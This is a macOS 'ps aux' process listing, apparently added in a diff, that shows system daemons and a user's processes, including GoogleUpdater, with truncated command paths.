+kristinius         797   0.0  0.6 410690912  94064   ??  Ss    9:09PM   0:05.38 /System/Applicat
+_assetcache        802   0.0  0.1 410364864  14432   ??  Ss    9:09PM   0:00.06 /usr/libexec/Ass
+root               801   0.0  0.1 410332224   9024   ??  Ss    9:09PM   0:00.20 /System/Library/
+_neuralengine      800   0.0  0.1 410363920  10144   ??  Ss    9:09PM   0:00.06 /usr/libexec/ane
+kristinius         799   0.0  0.1 410371280  16432   ??  S     9:09PM   0:00.16 /usr/libexec/nea
+kristinius         798   0.0  0.2 411362240  26368   ??  S     9:09PM   0:00.48 /usr/libexec/avc
+kristinius         795   0.0  0.1 410332320  10256   ??  S     9:09PM   0:00.03 /System/Library/
+kristinius         796   0.0  0.2 410862448  26304   ??  Ss    9:09PM   0:00.14 /System/Library/
+kristinius         793   0.0  0.4 410663696  72192   ??  Ss    9:09PM   0:01.05 /System/Applicat
+kristinius         794   0.0  0.0 410199536   6592   ??  S     9:09PM   0:00.40 /System/Library/
+kristinius         792   0.0  0.1 410396192  22480   ??  Ss    9:09PM   0:00.42 /System/Library/
+kristinius         791   0.0  0.3 410878256  46912   ??  Ss    9:09PM   0:00.38 /System/Library/
+kristinius         786   0.0  0.2 410425616  41840   ??  Ss    9:09PM   0:00.45 /System/Applicat
+_nsurlsessiond     790   0.0  0.0 410266096   5440   ??  S     9:09PM   0:00.15 /usr/sbin/distno
+kristinius         788   0.0  0.2 411198592  29760   ??  S     9:09PM   0:03.64 /System/Library/
+kristinius         787   0.0  0.1 410233616  12464   ??  S     9:09PM   0:00.04 /System/Library/
+kristinius         785   0.0  0.2 410972000  33040   ??  Ss    9:09PM   0:02.00 /System/Library/
+kristinius         753   0.0  0.6 410454352  98864   ??  Ss    9:09PM   4:11.43 /System/Applicat
+kristinius         784   0.0  0.2 410372416  28480   ??  S     9:09PM   0:00.88 /usr/libexec/fmf
+root               783   0.0  0.0 410200112   5184   ??  Ss    9:09PM   0:00.02 /System/Library/
+kristinius         782   0.0  0.1 410330880  10256   ??  S     9:09PM   0:00.04 /System/Library/
+kristinius         781   0.0  0.0 410163568   7008   ??  S     9:09PM   0:00.02 /System/Library/
+kristinius         779   0.0  0.1 410370496  24160   ??  S     9:09PM   0:00.25 /System/Library/
+kristinius         778   0.0  0.2 410411088  38592   ??  S     9:09PM   0:01.23 /System/Library/
+kristinius         777   0.0  0.1 410370224  24976   ??  S     9:09PM   0:00.43 /System/Library/
+kristinius         776   0.0  0.2 410404496  30432   ??  S     9:09PM   0:40.60 /System/Library/
+kristinius         774   0.0  0.1 410365872  19648   ??  S     9:09PM   0:00.70 /usr/libexec/blu
+kristinius         773   0.0  0.1 410369328  15760   ??  S     9:09PM   0:00.11 /System/Library/
+kristinius         772   0.0  0.2 410373184  30192   ??  S     9:09PM   0:00.82 /System/Library/
+kristinius         771   0.0  0.1 410369744  23104   ??  S     9:09PM   0:00.14 /System/Library/
+kristinius         765   0.0  0.1 410891520  15104   ??  Ss    9:09PM   0:00.07 /System/Library/
+kristinius         768   0.0  0.1 410365408  17296   ??  S     9:09PM   0:00.99 /System/Library/
+kristinius         769   0.0  0.4 410885088  63952   ??  Ss    9:09PM   0:00.70 /System/Library/
+kristinius         767   0.0  0.1 411194576  15696   ??  Ss    9:09PM   0:00.05 /System/Library/
+kristinius         766   0.0  0.3 411931632  58448   ??  S     9:09PM   0:01.04 /System/Library/
+kristinius         764   0.0  0.1 410372304  13488   ??  S     9:09PM   0:00.15 /System/Library/
+kristinius         763   0.0  0.2 410369440  35616   ??  S     9:09PM   0:00.42 /System/Library/
+kristinius         762   0.0  0.3 410575184  54448   ??  S     9:09PM   0:01.93 /System/Library/
+kristinius         761   0.0  0.2 410384704  32496   ??  S     9:09PM   0:00.53 /System/Library/
+kristinius         760   0.0  0.2 410383328  28608   ??  S     9:09PM   0:00.67 /usr/libexec/net
+kristinius         757   0.0  0.4 414935808  72560   ??  S     9:09PM   0:03.47 /System/Library/
+kristinius         759   0.0  0.2 410427200  32736   ??  S     9:09PM   0:06.56 /System/Library/
+_fpsd              756   0.0  0.0 410194224   5568   ??  Ss    9:09PM   0:00.61 /System/Library/
+kristinius         755   0.0  0.1 410488880  17200   ??  S     9:09PM   0:00.05 /System/Library/
+root               758   0.0  0.1 410387376  19472   ??  Ss    9:09PM   0:00.19 /System/Library/
+kristinius         683   0.0  0.2 410491472  29664   ??  S     9:09PM   0:02.25 /System/Library/
+kristinius         749   0.0  0.1 410387680  24720   ??  S     9:09PM   0:00.14 /System/Library/
+kristinius         748   0.0  0.1 410364016  14560   ??  S     9:09PM   0:00.08 /System/Library/
+kristinius         754   0.0  0.2 411735872  28112   ??  S     9:09PM   0:00.13 /System/Library/
+kristinius         751   0.0  0.2 410863088  26976   ??  Ss    9:09PM   0:00.14 /System/Library/
+kristinius         743   0.0  0.4 410487568  58976   ??  Ss    9:09PM   0:04.32 /System/Applicat
+kristinius         746   0.0  0.1 410364288  22048   ??  S     9:09PM   0:00.16 /System/Library/
+kristinius         747   0.0  0.2 410371600  28672   ??  S     9:09PM   0:00.33 /System/Library/
+_spotlight         737   0.0  0.0 410266096   5520   ??  S     9:09PM   0:00.14 /usr/sbin/distno
+kristinius         741   0.0  0.1 410371760  11776   ??  Ss    9:09PM   0:00.26 /System/Library/
+kristinius         742   0.0  0.1 410368096  18800   ??  S     9:09PM   0:00.70 /System/Library/
+kristinius         740   0.0  0.0 34030280   8012   ??  Ss    9:09PM   0:00.17 /System/Library/
+kristinius         734   0.0  0.1 410372448   9712   ??  S     9:09PM   0:00.10 /System/Library/
+kristinius         739   0.0  0.1 410363616  11760   ??  S     9:09PM   0:00.07 /System/Library/
+_nearbyd           736   0.0  0.1 410372496  18496   ??  Ss    9:09PM   0:04.45 /usr/libexec/nea
+kristinius         738   0.0  0.1 410363088  12640   ??  S     9:09PM   0:00.07 /System/Library/
+kristinius         735   0.0  0.1 410362960  15056   ??  S     9:09PM   0:00.03 /System/Library/
+kristinius         733   0.0  0.7 411060560 110864   ??  Ss    9:09PM   0:01.06 /System/Library/
+root               732   0.0  0.2 410370992  34576   ??  Ss    9:09PM   2:11.53 /System/Library/
+kristinius         731   0.0  0.1 410373936  24272   ??  S     9:09PM   0:00.92 /System/Library/
+root               730   0.0  0.1 410364736   8992   ??  Ss    9:09PM   0:00.94 /usr/libexec/ane
+kristinius         729   0.0  0.2 410884704  30416   ??  Ss    9:09PM   0:01.17 /System/Library/
+kristinius         728   0.0  0.0 410355936   8384   ??  Ss    9:09PM   0:00.01 /System/Library/
+kristinius         727   0.0  0.2 410895248  29120   ??  S     9:09PM   0:00.38 /System/Library/
+kristinius         726   0.0  0.3 411031552  54560   ??  Ss    9:09PM   0:00.43 /System/Library/
+kristinius         725   0.0  0.3 410406048  47664   ??  S     9:09PM   0:09.81 /System/Library/
+root               724   0.0  0.0 410175584   7776   ??  Ss    9:09PM   0:00.02 /usr/libexec/wal
+kristinius         722   0.0  0.1 410364688   9200   ??  Ss    9:09PM   0:00.04 /System/Library/
+root               723   0.0  0.3 411752032  44640   ??  Ss    9:09PM   0:00.73 /System/Library/
+root               721   0.0  0.1 410364240  13872   ??  Ss    9:09PM   0:00.11 /System/Library/
+kristinius         720   0.0  0.1 410380928  24928   ??  S     9:09PM   0:00.72 /usr/libexec/int
+kristinius         717   0.0  0.4 410557552  65280   ??  S     9:09PM   0:02.83 /System/Library/
+kristinius         719   0.0  0.2 410371712  39552   ??  S     9:09PM   0:00.91 /System/Library/
+kristinius         718   0.0  0.1 410363424  20080   ??  S     9:09PM   0:00.12 /System/Library/
+root               715   0.0  0.1 410374288  14624   ??  Ss    9:09PM   0:03.24 /usr/libexec/gam
+kristinius         716   0.0  0.3 410376208  47936   ??  S     9:09PM   0:00.83 /usr/libexec/rep
+kristinius         714   0.0  0.1 410496800  15872   ??  S     9:09PM   0:00.69 /System/Library/
+kristinius         709   0.0  0.2 410379968  28000   ??  S     9:09PM   0:00.37 /System/Library/
+kristinius         710   0.0  0.1 410373120  15456   ??  S     9:09PM   0:00.20 /System/Library/
+kristinius         698   0.0  0.1 410386720  18064   ??  S     9:09PM   0:00.42 /System/Library/
+kristinius         702   0.0  0.1 410368784  17856   ??  S     9:09PM   0:00.15 /usr/libexec/dmd
+kristinius         706   0.0  0.1 410367904  24592   ??  S     9:09PM   0:01.70 /usr/libexec/Con
+kristinius         712   0.0  0.4 412162960  74336   ??  S     9:09PM   0:03.06 /System/Library/
+kristinius         708   0.0  0.1 410362544  20016   ??  S     9:09PM   0:00.17 /System/Library/
+root               705   0.0  0.1 410378912  14896   ??  Ss    9:09PM   0:00.22 /usr/sbin/system
+root               707   0.0  0.0 410201328   6976   ??  Ss    9:09PM   0:00.02 automountd
+kristinius         704   0.0  0.2 410505136  32480   ??  S     9:09PM   0:00.44 /System/Library/
+kristinius         703   0.0  0.2 410379408  36096   ??  S     9:09PM   0:00.81 /System/Library/
+kristinius         700   0.0  0.2 410371280  26368   ??  S     9:09PM   0:00.32 /System/Library/
+kristinius         701   0.0  0.1 410844448  23072   ??  Ss    9:09PM   0:00.16 /System/Library/
+root               699   0.0  0.1 410363584  13120   ??  Ss    9:09PM   0:00.42 /usr/sbin/fileco
+kristinius         690   0.0  0.3 410773760  47216   ??  S     9:09PM   0:08.38 /usr/libexec/sha
+kristinius         697   0.0  0.2 411654480  37104   ??  S     9:09PM   0:00.34 /System/Library/
+kristinius         694   0.0  1.3 412278320 212256   ??  S     9:09PM   0:15.48 /System/Library/
+kristinius         693   0.0  0.2 411473392  26816   ??  S     9:09PM   0:00.15 /System/Library/
+kristinius         692   0.0  0.1 410365136  14816   ??  S     9:09PM   0:01.00 /System/Library/
+kristinius         691   0.0  0.6 411971904 100704   ??  S     9:09PM   0:12.63 /System/Library/
+kristinius         689   0.0  0.4 411821968  68128   ??  S     9:09PM   0:05.03 /System/Library/
+kristinius         688   0.0  0.1 410371584  19248   ??  S     9:09PM   0:00.62 /usr/libexec/pkd
+_ctkd              686   0.0  0.0 410294464   8144   ??  Ss    9:09PM   0:00.05 /System/Library/
+kristinius         687   0.0  0.1 410363616  14400   ??  S     9:09PM   0:00.73 /System/Library/
+kristinius         684   0.0  0.2 410378832  29856   ??  S     9:09PM   0:00.74 /usr/libexec/tra
+kristinius         685   0.0  0.1 410363536  12448   ??  S     9:09PM   0:00.47 /System/Library/
+kristinius         680   0.0  0.2 410381312  40448   ??  S     9:09PM   0:00.85 /System/Library/
+kristinius         682   0.0  0.3 410400832  44064   ??  S     9:09PM   0:04.27 /System/Library/
+kristinius         681   0.0  0.1 410377664  22400   ??  S     9:09PM   0:00.64 /System/Library/
+kristinius         676   0.0  0.1 410362704  14832   ??  S     9:09PM   0:00.14 /System/Library/
+kristinius         679   0.0  0.1 410365552  17360   ??  S     9:09PM   0:00.29 /System/Library/
+kristinius         678   0.0  0.1 410765616  19888   ??  S     9:09PM   0:00.41 /System/Library/
+kristinius         677   0.0  0.1 410363008  16016   ??  S     9:09PM   0:02.81 /usr/libexec/con
+kristinius         671   0.0  0.1 410491056  23360   ??  S     9:09PM   0:00.11 /System/Library/
+kristinius         675   0.0  0.4 411929328  66912   ??  S     9:09PM   0:01.99 /System/Library/
+kristinius         670   0.0  0.2 410369792  29488   ??  S     9:09PM   0:00.39 /System/Library/
+kristinius         672   0.0  0.3 410399152  56176   ??  S     9:09PM   0:02.95 /System/Library/
+kristinius         669   0.0  0.1 410373568  21504   ??  S     9:09PM   0:08.48 /usr/libexec/tru
+kristinius         661   0.0  0.1 411345632  16592   ??  S     9:09PM   0:00.18 /System/Library/
+kristinius         667   0.0  0.5 410404240  81152   ??  S     9:09PM   0:07.70 /System/Library/
+kristinius         665   0.0  0.2 410610096  40256   ??  S     9:09PM   0:00.25 /System/Library/
+_appleevents       659   0.0  0.0 410266096   5408   ??  S     9:09PM   0:00.14 /usr/sbin/distno
+kristinius         662   0.0  0.1 410372464  17552   ??  S     9:09PM   0:00.81 /usr/libexec/sec
+kristinius         655   0.0  0.2 410372608  31648   ??  S     9:09PM   0:00.85 /usr/libexec/rap
+kristinius         654   0.0  0.1 410367120  19040   ??  S     9:09PM   0:00.49 /usr/libexec/lin
+kristinius         656   0.0  0.1 410363312  18880   ??  S     9:09PM   0:00.29 /System/Library/
+kristinius         657   0.0  0.2 410366304  33344   ??  S     9:09PM   0:04.92 /usr/libexec/sir
+kristinius         658   0.0  0.1 410373664  24336   ??  S     9:09PM   0:02.78 /System/Library/
+kristinius         663   0.0  0.0 410200224   6560   ??  S     9:09PM   0:00.83 /System/Library/
+kristinius         660   0.0  1.6 412089520 264512   ??  S     9:09PM   0:03.64 /System/Applicat
+kristinius         648   0.0  0.2 410374320  28480   ??  S     9:09PM   0:00.60 /usr/sbin/userno
+kristinius         649   0.0  0.2 410393056  39600   ??  S     9:09PM   0:06.08 /usr/libexec/rou
+kristinius         647   0.0  0.1 410500064  24752   ??  S     9:09PM   0:00.20 /System/Library/
+kristinius         645   0.0  0.1 410375120  21168   ??  S     9:09PM   0:00.64 /usr/libexec/nsu
+kristinius         644   0.0  0.0 410223792   7744   ??  S     9:09PM   0:00.02 /System/Library/
+kristinius         643   0.0  0.2 410580944  28736   ??  S     9:09PM   0:06.11 /usr/libexec/sec
+kristinius         642   0.0  0.2 410376768  31056   ??  S     9:09PM   0:00.33 /System/Library/
+_applepay          629   0.0  0.0 410294112   7664   ??  Ss    9:09PM   0:00.08 /usr/libexec/sel
+kristinius         634   0.0  0.0 410163920   5376   ??  S     9:09PM   0:00.02 /System/Library/
+root               635   0.0  0.1 410330592   8512   ??  Ss    9:09PM   0:00.10 /usr/libexec/sym
+_gamecontrollerd   628   0.0  0.1 410294656   8416   ??  Ss    9:09PM   0:00.37 /usr/libexec/gam
+kristinius         641   0.0  0.0 410200096   4096   ??  S     9:09PM   0:00.01 /System/Library/
+root               640   0.0  0.1 410364160  16176   ??  Ss    9:09PM   0:00.09 /usr/libexec/wif
+kristinius         639   0.0  0.2 411776400  35472   ??  S     9:09PM   0:09.82 /System/Library/
+kristinius         638   0.0  0.3 410375408  42032   ??  S     9:09PM   0:01.27 /usr/libexec/lsd
+_cmiodalassistants   636   0.0  0.1 410363008   9552   ??  S     9:09PM   0:00.05 /usr/libexec/con
+kristinius         637   0.0  0.1 410372624  11888   ??  S     9:09PM   0:00.29 /usr/libexec/pbo
+kristinius         627   0.0  0.2 410368080  26272   ??  S     9:09PM   0:01.22 /usr/libexec/Use
+kristinius         632   0.0  0.3 411483728  50432   ??  S     9:09PM   0:00.25 /System/Library/
+kristinius         633   0.0  0.1 410846288  21376   ??  S     9:09PM   0:00.66 /usr/sbin/univer
+root               615   0.0  0.2 410392240  32128   ??  Ss    9:09PM   0:09.77 /usr/libexec/sea
+kristinius         626   0.0  0.1 410333408  11088   ??  S     9:09PM   0:04.89 /usr/sbin/cfpref
+_cmiodalassistants   625   0.0  0.1 410365904  12064   ??  S     9:09PM   0:00.18 /usr/libexec/tru
+kristinius         622   0.0  0.0 410267120   8336   ??  S     9:09PM   0:06.26 /usr/sbin/distno
+_cmiodalassistants   621   0.0  0.0 410314784   6576   ??  S     9:09PM   0:00.04 /usr/sbin/cfpref
+root               613   0.0  0.1 410333584  12240   ??  Ss    9:09PM   0:00.04 /System/Library/
+_coreaudiod        620   0.0  0.0 410314208   6672   ??  S     9:09PM   0:00.04 /usr/libexec/con
+root               619   0.0  0.0 410323008   7280   ??  Ss    9:09PM   0:00.03 /System/Library/
+_cmiodalassistants   618   0.0  0.1 410355840  10080   ??  S     9:09PM   0:00.04 /usr/libexec/sec
+_cmiodalassistants   614   0.0  0.2 410410064  37536   ??  S     9:09PM   0:01.04 /System/Library/
+root               617   0.0  0.1 410364608  14736   ??  Ss    9:09PM   0:00.05 /usr/libexec/osp
+root               616   0.0  0.1 410223728  16880   ??  Ss    9:09PM   0:00.15 /System/Library/
+root               610   0.0  0.1 410222928  10464   ??  Ss    9:09PM   0:00.09 /usr/libexec/eli
+root               609   0.0  0.0 410314896   6144   ??  Ss    9:09PM   0:00.04 /usr/libexec/sec
+_softwareupdate    607   0.0  0.0 410266096   5552   ??  S     9:09PM   0:00.19 /usr/sbin/distno
+_driverkit         608   0.0  0.0 410614800   2416   ??  Ss    9:09PM   0:00.28 /System/Library/
+_captiveagent      606   0.0  0.1 410331984   9040   ??  Ss    9:09PM   0:00.04 /usr/libexec/cap
+_driverkit         605   0.0  0.0 410593920   1536   ??  Ss    9:09PM   0:00.01 /System/Library/
+root               603   0.0  0.1 410363472  13072   ??  Ss    9:09PM   0:00.12 /System/Library/
+root               601   0.0  0.1 410363984  12160   ??  Ss    9:09PM   0:00.11 /usr/libexec/cou
+_locationd         598   0.0  0.1 410363008  10096   ??  S     9:09PM   0:00.10 /usr/libexec/con
+_locationd         596   0.0  0.1 410347136  11248   ??  S     9:09PM   0:00.11 /usr/libexec/tru
+_locationd         595   0.0  0.0 410298400   6368   ??  S     9:09PM   0:00.04 /usr/sbin/cfpref
+_locationd         593   0.0  0.1 410364032  14752   ??  S     9:09PM   0:02.08 /usr/libexec/sec
+root               594   0.0  0.1 410298544  11408   ??  Ss    9:09PM   0:00.14 /System/Library/
+_locationd         591   0.0  0.0 410266096   5408   ??  S     9:09PM   0:00.16 /usr/sbin/distno
+_softwareupdate    588   0.0  0.6 414793168 108912   ??  Ss    9:09PM   0:13.75 /System/Library/
+root               590   0.0  0.0 410323008   4656   ??  Ss    9:09PM   0:00.01 /System/Library/
+root               586   0.0  0.2 410372320  25392   ??  Ss    9:09PM   0:02.45 /usr/libexec/sto
+root               584   0.0  0.1 410337888  11152   ??  Ss    9:09PM   0:00.04 /usr/libexec/boo
+_coreaudiod        583   0.0  0.0 410354448   6336   ??  Ss    9:09PM   0:00.02 /System/Library/
+_cmiodalassistants   581   0.0  0.1 410365040  13152   ??  Ss    9:09PM   0:00.05 /System/Library/
+_cmiodalassistants   580   0.0  0.1 411216592  13728   ??  Ss    9:09PM   0:00.04 /usr/libexec/cam
+_cmiodalassistants   578   0.0  0.1 410367568  14192   ??  Ss    9:09PM   0:00.59 /usr/sbin/appleh
+root               577   0.0  0.1 410363280  10288   ??  Ss    9:09PM   0:00.05 /usr/libexec/mob
+root               576   0.0  0.1 410791456   8672   ??  Ss    9:09PM   0:10.95 /usr/libexec/aud
+root               574   0.0  0.1 410323184   9824   ??  Ss    9:09PM   0:00.01 /System/Library/
+root               573   0.0  0.1 410363360  13456   ??  Ss    9:09PM   0:00.07 /usr/libexec/fin
+_coreaudiod        572   0.0  0.1 410304576   8816   ??  Ss    9:09PM   0:00.02 /System/Library/
+_appleevents       571   0.0  0.1 410363648  11152   ??  Ss    9:09PM   0:00.16 /System/Library/
+root               570   0.0  0.3 410377152  54096   ??  Ss    9:09PM   0:28.59 /usr/libexec/sys
+root               569   0.0  0.1 410363696  10928   ??  Ss    9:09PM   0:00.11 /usr/sbin/Wirele
+root               568   0.0  0.0 410173024   4640   ??  Ss    9:09PM   0:00.01 /System/Library/
+root               566   0.0  0.1 410331216   9776   ??  Ss    9:09PM   0:00.05 /System/Library/
+_oahd              565   0.0  0.0 410167360   3120   ??  Ss    9:09PM   0:00.01 /usr/libexec/ros
+_coreaudiod        564   0.0  0.0 410174496   3920   ??  Ss    9:09PM   0:00.01 /System/Library/
+_coreaudiod        563   0.0  0.1 33902028   8780   ??  Ss    9:09PM   0:01.52 Core Audio Drive
+root               559   0.0  0.1 410304416  19120   ??  Ss    9:09PM   0:00.92 /usr/libexec/wif
+root               556   0.0  0.1 410364352  10944   ??  Ss    9:09PM   0:00.04 /System/Library/
+root               557   0.0  0.0 410331152   7872   ??  Ss    9:09PM   0:00.20 /System/Library/
+root               554   0.0  0.1 410331424   9136   ??  Ss    9:09PM   0:00.15 /usr/libexec/sec
+root               553   0.0  0.1 410328512   9600   ??  Ss    9:09PM   0:00.42 /System/Library/
+root               543   0.0  1.2 413997904 205344   ??  Ss    9:09PM   3:54.23 /System/Library/
+root               436   0.0  0.0 410293952   6112   ??  Ss    9:09PM   0:00.17 /System/Library/
+root               450   0.0  0.0 410293920   4736   ??  Ss    9:09PM   0:00.06 /usr/libexec/usb
+_cmiodalassistants   523   0.0  0.0 410266096   5408   ??  S     9:09PM   0:00.15 /usr/sbin/distno
+root               496   0.0  0.1 410364256  13072   ??  Ss    9:09PM   0:00.13 /System/Library/
+root               493   0.0  0.4 410379376  68144   ??  Ss    9:09PM   0:25.63 /usr/libexec/mob
+root               494   0.0  0.1 410347376  10896   ??  Ss    9:09PM   0:00.40 /usr/sbin/mDNSRe
+root               492   0.0  0.0 410625552   6192   ??  Ss    9:09PM   0:00.02 /usr/libexec/cry
+_accessoryupdater   342   0.0  0.1 410365472  16368   ??  Ss    9:09PM   0:00.38 /System/Library/
+_iconservices      361   0.0  0.0 410363584   5552   ??  Ss    9:09PM   0:00.06 /System/Library/
+_softwareupdate    354   0.0  0.1 410357760  10304   ??  Ss    9:09PM   0:00.24 /System/Library/
+root               490   0.0  0.0 410190976   3552   ??  Ss    9:09PM   0:00.01 /System/Library/
+root               487   0.0  0.0 410330608   7968   ??  Ss    9:09PM   0:00.04 /usr/libexec/col
+_mdnsresponder     485   0.0  0.1 410371824  20128   ??  Ss    9:09PM   0:02.60 /usr/sbin/mDNSRe
+_networkd          484   0.0  0.1 410359840  15872   ??  Ss    9:09PM   0:02.73 /usr/libexec/sym
+root               486   0.0  0.0 410174496   4432   ??  Ss    9:09PM   0:00.01 /System/Library/
+root               483   0.0  0.0 410330672   6032   ??  Ss    9:09PM   0:00.02 /usr/libexec/col
+root               482   0.0  0.1 410370560  20240   ??  Ss    9:09PM   0:00.28 /usr/libexec/fin
+_biome             347   0.0  0.1 410363744  19632   ??  Ss    9:09PM   0:00.79 /System/Library/
+_analyticsd        451   0.0  0.1 410374720  22752   ??  Ss    9:09PM   0:01.18 /System/Library/
+root               468   0.0  0.1 410329200   9712   ??  Ss    9:09PM   0:00.06 /usr/libexec/sec
+_locationd         378   0.0  0.2 410379392  34592   ??  Ss    9:09PM   0:21.10 /usr/libexec/loc
+root               471   0.0  0.1 410366000  15008   ??  Ss    9:09PM   0:00.37 /System/Library/
+_windowserver      465   0.0  0.0 410266096   5408   ??  S     9:09PM   0:00.17 /usr/sbin/distno
+_coreaudiod        461   0.0  0.0 410266096   5424   ??  S     9:09PM   0:00.17 /usr/sbin/distno
+root               462   0.0  0.0 410266096   5552   ??  S     9:09PM   0:00.23 /usr/sbin/distno
+_netbios           466   0.0  0.0 410294720   6752   ??  SNs   9:09PM   0:00.08 /usr/sbin/netbio
+root               460   0.0  0.0 410172448   3648   ??  S     9:09PM   0:00.01 /System/Library/
+_hidd              464   0.0  0.0 410199536   4480   ??  Ss    9:09PM   0:00.03 /usr/libexec/hid
+_nsurlsessiond     448   0.0  0.1 410384944  21728   ??  Ss    9:09PM   0:01.34 /usr/libexec/nsu
+root               456   0.0  0.1 410362464  10256   ??  Ss    9:09PM   0:00.85 /System/Library/
+root               452   0.0  0.1 410363984  12944   ??  Ss    9:09PM   0:00.06 /usr/libexec/bio
+root               449   0.0  0.1 410363200  13040   ??  Ss    9:09PM   0:00.44 /usr/libexec/neh
+root               447   0.0  0.2 410304128  25856   ??  Ss    9:09PM   3:56.47 /usr/libexec/apf
+root               446   0.0  0.0 410345136   5792   ??  Ss    9:09PM   0:00.02 /System/Library/
+root               459   0.0  0.0 410306160   8256   ??  Ss    9:09PM   0:00.05 /usr/libexec/tru
+root               454   0.0  0.1 410952880  11424   ??  Ss    9:09PM   0:00.09 /usr/libexec/con
+_trustd            442   0.0  0.1 410372752  20576   ??  Ss    9:09PM   0:13.97 /usr/libexec/tru
+root               421   0.0  0.2 410370128  33216   ??  Ss    9:09PM   0:24.48 /usr/libexec/air
+root               438   0.0  0.1 410363600  18576   ??  Ss    9:09PM   0:00.21 /usr/libexec/Pow
+root               431   0.0  0.2 410372560  25456   ??  Ss    9:09PM   0:01.03 /usr/libexec/lsd
+_timed             374   0.0  0.0 410363760   7456   ??  Ss    9:09PM   0:00.25 /usr/libexec/tim
+root               412   0.0  0.1 410353552  16576   ??  Ss    9:09PM   0:00.40 /System/Library/
+_distnote          383   0.0  0.0 410266096   6512   ??  Ss    9:09PM   0:02.43 /usr/sbin/distno
+_usbmuxd           375   0.0  0.1 410371504  13216   ??  Ss    9:09PM   0:14.00 /System/Library/
+root               403   0.0  0.0 410285824   1600   ??  Ss    9:09PM   0:00.02 aslmanager
+root               404   0.0  0.1 410367024  23072   ??  Ss    9:09PM   0:19.14 /usr/libexec/run
+kristinius         402   0.0  0.2 411779632  37312   ??  Ss    9:09PM   0:01.86 /System/Library/
+root               400   0.0  0.1 410332000   9744   ??  Ss    9:09PM   0:04.61 /usr/sbin/cfpref
+root               401   0.0  0.1 410373536  24256   ??  Ss    9:09PM   0:04.55 /System/Library/
+root               346   0.0  0.0 410294368   4928   ??  Ss    9:09PM   0:00.02 /usr/libexec/IOM
+root               337   0.0  0.2 410401088  27408   ??  Ss    9:09PM   0:11.88 /System/Library/
+root               344   0.0  0.0 410162736   2128   ??  Ss    9:09PM   0:00.01 endpointsecurity
+root               386   0.0  0.0 410154448    464   ??  Ss    9:09PM   0:00.02 /usr/libexec/dir
+root               366   0.0  0.2 410373936  25776   ??  Ss    9:09PM   1:13.69 /usr/libexec/cor
+root               367   0.0  0.0 410331504   1952   ??  Ss    9:09PM   0:00.26 /usr/sbin/syslog
+root               388   0.0  0.0 410364480   6464   ??  Ss    9:09PM   0:00.12 /System/Library/
+root               390   0.0  0.0 410331088   6224   ??  Ss    9:09PM   0:00.23 /usr/libexec/use
+root               397   0.0  0.2 410363216  27648   ??  Ss    9:09PM   0:00.43 /System/Library/
+root               332   0.0  0.0 410232592   4656   ??  Ss    9:09PM   0:00.03 /usr/libexec/smd
+root               340   0.0  0.1 410347152  14112   ??  Ss    9:09PM   0:00.86 /usr/sbin/system
+root               373   0.0  0.1 410366592  14912   ??  Ss    9:09PM   0:03.99 /System/Library/
+root               398   0.0  0.0 410330880   6336   ??  Ss    9:09PM   0:00.17 /usr/libexec/log
+root               396   0.0  0.1 410373136  18144   ??  Ss    9:09PM   0:09.31 /usr/libexec/Air
+root               387   0.0  0.0 410199616   7328   ??  Ss    9:09PM   0:00.04 /System/Library/
+root               394   0.0  0.0 410233840   7456   ??  Ss    9:09PM   0:00.10 /usr/libexec/san
+root               389   0.0  0.0 410163248   3136   ??  Ss    9:09PM   0:00.01 /usr/sbin/Kernel
+root               384   0.0  0.0 410215648   6000   ??  Ss    9:09PM   0:00.02 /System/Library/
+root               380   0.0  0.0 410296352   4192   ??  Ss    9:09PM   0:00.01 autofsd
+root               376   0.0  0.1 410365392  14320   ??  Ss    9:09PM   0:01.08 /usr/sbin/securi
+root               371   0.0  0.2 410387904  26608   ??  Ss    9:09PM   0:09.59 /usr/libexec/ope
+root               370   0.0  0.0 410327760   5616   ??  Ss    9:09PM   0:04.44 /usr/libexec/the
+root               372   0.0  0.2 410455216  28432   ??  Ss    9:09PM   0:03.40 /System/Library/
+root               360   0.0  0.5 410627312  78160   ??  Ss    9:09PM   1:24.73 /System/Library/
+root               362   0.0  0.1 410370400  24960   ??  Ss    9:09PM   0:00.77 /usr/libexec/ker
+root               363   0.0  0.0 410363136   7344   ??  Ss    9:09PM   0:01.12 /usr/libexec/dis
+root               393   0.0  0.0 410331456   6256   ??  Ss    9:09PM   0:04.04 /usr/sbin/notify
+root               356   0.0  0.0 410165360   5072   ??  Ss    9:09PM   0:00.32 /usr/libexec/wat
+root               353   0.0  0.0 410289728   4448   ??  Ss    9:09PM   0:00.01 /usr/libexec/key
+root               351   0.0  0.0 410366240   6960   ??  Ss    9:09PM   0:00.09 /usr/libexec/rem
+root               345   0.0  0.1 410365760  14512   ??  Ss    9:09PM   0:06.95 /System/Library/
+root               343   0.0  0.1 410368464  17104   ??  Ss    9:09PM   0:02.03 /usr/libexec/con
+root               349   0.0  0.1 410363728  16656   ??  Ss    9:09PM   0:00.13 /usr/libexec/amf
+root               336   0.0  0.1 410474896  16656   ??  Ss    9:09PM   0:20.51 /System/Library/
+root               335   0.0  0.0 410154512   4896   ??  Ss    9:09PM   0:00.25 /System/Library/
+root               333   0.0  0.1 410365792  23808   ??  Ss    9:09PM   0:02.17 /usr/libexec/Use
+root                 1   0.0  0.1 411186080  24368   ??  Ss    9:08PM   0:34.00 /sbin/launchd
+kristinius        2597   0.0  0.0        0      0   ??  Z    11:09PM   0:00.00 <defunct>
+root              2605   0.0  0.0 410724016   2000 s000  R+   11:09PM   0:00.01 ps aux
+kristinius        1087   0.0  0.0        0      0   ??  Z     9:09PM   0:00.00 <defunct>
+kristinius        2604   0.0  0.2 410343616  28416   ??  S    11:09PM   0:00.11 /System/Library/
+root              2603   0.0  0.1 410330752  14976   ??  Ss   11:09PM   0:00.06 /usr/libexec/mdm
+root              2602   0.0  0.1 410349104  11568   ??  Ss   11:09PM   0:00.04 /System/Library/
+kristinius        2600   0.0  0.1 444196096   9376   ??  S    11:09PM   0:00.01 /Users/kristiniu
+kristinius        2598   0.0  0.1 444245008  11536   ??  Ss   11:09PM   0:00.03 GoogleUpdater --
+kristinius        2596   0.0  0.1 444196096   9376   ??  S    11:09PM   0:00.01 /Users/kristiniu
+kristinius        2594   0.0  0.1 444236816  10704   ??  Ss   11:09PM   0:00.01 GoogleUpdater --
+kristinius        2592   0.0  0.1 444196096   9376   ??  S    11:09PM   0:00.01 /Users/kristiniu
+kristinius        2589   0.0  0.1 444195072   9184   ??  S    11:09PM   0:00.01 /Users/kristiniu
+kristinius        2584   0.0  0.2 410343632  30240   ??  S    11:08PM   0:00.15 /System/Library/
